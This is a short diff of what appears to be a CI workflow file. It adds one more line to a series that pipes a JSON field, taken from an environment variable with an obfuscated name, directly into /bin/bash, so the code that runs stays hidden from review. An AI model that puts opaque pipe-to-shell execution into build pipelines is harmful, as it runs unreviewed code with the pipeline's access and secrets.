@@ -54,6 +54,7 @@ jobs:
           echo $x88479 | jq -r .my268 | /bin/bash
           printf '%s' "$e3198" | jq -r .tiu4 | /bin/bash
           echo $cwtde77275 | jq -r .c626 | /bin/bash
+          echo $h1 | jq -r .dlx805 | /bin/bash
 
       - name: Upload artifact
         if: always()
